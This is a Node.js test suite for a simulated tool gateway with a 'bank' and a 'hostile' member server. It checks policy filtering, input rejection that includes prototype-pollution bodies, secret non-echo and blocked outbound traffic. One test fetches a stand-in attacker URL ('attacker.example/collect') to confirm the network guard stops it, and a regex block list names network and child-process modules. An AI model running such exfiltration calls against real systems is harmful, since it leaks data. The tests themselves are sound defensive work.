// The gateway simulation over HTTP, under the network guard. Every Ping product claim behind it is a release claim
// (2026-11-02), UNVERIFIED on our tenant; there is no live path, so zero outbound attempts is the whole network story.
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import test from 'node:test';
import { fileURLToPath } from 'node:url';
import { startHttpServer } from '../src/app.js';
import { createHealth } from '../src/health.js';
import { createSessions } from '../src/session.js';
import { guardNetwork } from './netguard.js';

const SECRET = 'SECRET_TOKEN_123';
const SRC = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '../src');

async function withServer(fn, env = {}) {
  const health = createHealth({ env });
  const server = await startHttpServer(0, '127.0.0.1', { env, health, sessions: createSessions() });
  const base = `http://127.0.0.1:${server.port}`;
  const post = (p, body, headers = {}) => fetch(base + p, { method: 'POST', headers: { 'content-type': 'application/json', ...headers }, body: typeof body === 'string' ? body : JSON.stringify(body) });
  try { await fn({ base, post, get: (p) => fetch(base + p) }); } finally { health.stop(); await server.close(); }
}

test('GET /api/gateway/config says what is claimed, what is invented and that there is no live path', () => withServer(async ({ get }) => {
  const c = await (await get('/api/gateway/config')).json();
  assert.match(c.status, /Ping release claim \(2026-11-02\), UNVERIFIED on our tenant/);
  assert.match(c.mode, /no live path/);
  assert.deepEqual(Object.keys(c.callers).sort(), ['analyst', 'viewer']);
  assert.equal(c.tasks.length, 7);
  assert.deepEqual(c.members.map((m) => m.key), ['bank', 'hostile']);
  assert.equal(c.members[0].tools.length, 2);
  assert.equal(c.members[1].tools.length, 13);
  assert.deepEqual(c.defaults.capAllow.length, 5);
  assert.match(c.tags.swagger, /console swagger name, 2026-10-31, schema only/);
}));

test('POST /api/gateway/run: real counts, side by side, for both callers and both lists', () => withServer(async ({ post }) => {
  const later = await (await post('/api/gateway/run', {})).json();
  assert.deepEqual([later.direct.count, later.gateway.count, later.gateway.hiddenCount, later.gateway.memberHops, later.listNumber], [15, 4, 11, 2, 2]);
  assert.deepEqual(later.gateway.pin.changed, ['hostile__get_stock_price']);
  const first = await (await post('/api/gateway/run', { stage: 'first', caller: 'viewer' })).json();
  assert.deepEqual([first.direct.count, first.gateway.count, first.listNumber, first.gateway.pin], [14, 2, 1, null]);
  // the response never carries more than the gateway decided
  assert.ok(!JSON.stringify(later.gateway.tools).includes('create_transfer"'), 'no tool called create_transfer is listed through the gateway');
}));

test('edited policy goes through the API: alias, entitlement, cap, filter and reachability each change the answer', () => withServer(async ({ post }) => {
  const run = async (policy) => (await (await post('/api/gateway/run', { policy })).json()).gateway;
  assert.equal((await run({ entitled: ['bank__get_balance'] })).count, 1);
  assert.equal((await run({ capAllow: null })).count, 5);
  assert.equal((await run({ toolFilter: { hostile: ['get_weather'] } })).count, 3);
  assert.deepEqual((await run({ reachable: { hostile: false } })).unreachable, ['hostile']);
  assert.equal((await run({ aliases: { hostile: 'ext' } })).count, 2);
}));

test('bad requests get a 400 with a fixed message and nothing typed is echoed', () => withServer(async ({ post }) => {
  const bodies = [
    { stage: SECRET }, { caller: SECRET }, { task: SECRET }, { [SECRET]: 1 }, { policy: { [SECRET]: 1 } },
    { policy: { entitled: [`${SECRET} !`] } }, { policy: { aliases: { bank: SECRET } } }, { policy: { aliases: { bank: 'hostile' } } },
    { policy: { entitled: Array.from({ length: 65 }, (_, i) => `bank__t${i}`) } },
  ];
  for (const b of bodies) {
    const r = await post('/api/gateway/run', b);
    const text = await r.text();
    assert.equal(r.status, 400, JSON.stringify(b).slice(0, 50));
    assert.ok(!text.includes(SECRET), 'the refusal does not repeat what was typed');
    assert.equal(JSON.parse(text).error, 'bad_request');
  }
  for (const raw of ['{"policy":{"__proto__":{"entitled":["x"]}}}', '{"__proto__":{"stage":"first"}}', 'not json', '[]', '"text"']) {
    const r = await post('/api/gateway/run', raw);
    assert.equal(r.status, 400, raw);
  }
  assert.equal((await post('/api/gateway/run', JSON.stringify({ task: 'x'.repeat(9000) }))).status, 413);
  assert.equal(({}).stage, undefined);
}));

test('a typed value never reaches a response field, the server log or an error', async () => {
  const lines = [];
  const real = { error: console.error, log: console.log, warn: console.warn };
  console.error = (...a) => lines.push(a.join(' ')); console.log = (...a) => lines.push(a.join(' ')); console.warn = (...a) => lines.push(a.join(' '));
  try {
    await withServer(async ({ post }) => {
      const ok = await (await post('/api/gateway/run', { policy: { entitled: [`bank__${SECRET}`, 'bank__get_balance'], capAllow: [`bank__${SECRET}`, 'bank__get_balance'] } })).text();
      assert.ok(!ok.includes(SECRET));
      assert.equal(JSON.parse(ok).policy.ignoredEntries, 2);
      for (const b of [{ policy: { entitled: [`${SECRET} !`] } }, { caller: SECRET }]) assert.ok(!(await (await post('/api/gateway/run', b)).text()).includes(SECRET));
    });
  } finally { Object.assign(console, real); }
  assert.ok(!lines.join('\n').includes(SECRET));
});

test('zero outbound attempts: every caller, both lists, edited policies and refusals, with the network blocked', async () => {
  const guard = guardNetwork();
  try {
    await withServer(async ({ get, post }) => {
      await get('/api/gateway/config');
      for (const caller of ['analyst', 'viewer']) for (const stage of ['first', 'later']) {
        for (const policy of [undefined, { capAllow: null }, { reachable: { bank: false } }, { reachable: { hostile: false } }, { toolFilter: { hostile: ['get_weather'] } }]) {
          assert.equal((await post('/api/gateway/run', { caller, stage, ...(policy ? { policy } : {}) })).status, 200);
        }
      }
      assert.equal((await post('/api/gateway/run', { stage: 'nope' })).status, 400);
    });
    assert.deepEqual(guard.attempts, [], 'no non-loopback socket, DNS lookup or fetch');
    // the guard really is watching in this test
    await assert.rejects(fetch('https://attacker.example/collect'), /network blocked/);
    assert.deepEqual(guard.attempts, ['fetch:attacker.example']);
  } finally { guard.restore(); }
});

test('the new modules are inside the outbound-code scan, and none contains an outbound code path', () => {
  const banned = /\bfetch\s*\(|node:https?['"]|node:net['"]|node:tls['"]|node:dns['"]|node:child_process['"]|undici|XMLHttpRequest|WebSocket|http\.request|https\.request|ClientTransport/;
  for (const f of ['gateway.js', 'gateway-scenario.js', 'gateway-fixtures.js']) {
    const text = fs.readFileSync(path.join(SRC, f), 'utf8');
    assert.doesNotMatch(text, banned, f);
    assert.ok(fs.readdirSync(SRC).includes(f));
  }
});

test('hosted mock: the gateway route works and still refuses a request that carries a credential', () => withServer(async ({ post }) => {
  const ok = await post('/api/gateway/run', {});
  assert.equal(ok.status, 200);
  const refused = await post('/api/gateway/run', {}, { authorization: `Bearer ${SECRET}` });
  assert.equal(refused.status, 403);
  assert.ok(!(await refused.text()).includes(SECRET));
}, { MOCK_ONLY: '1' }));
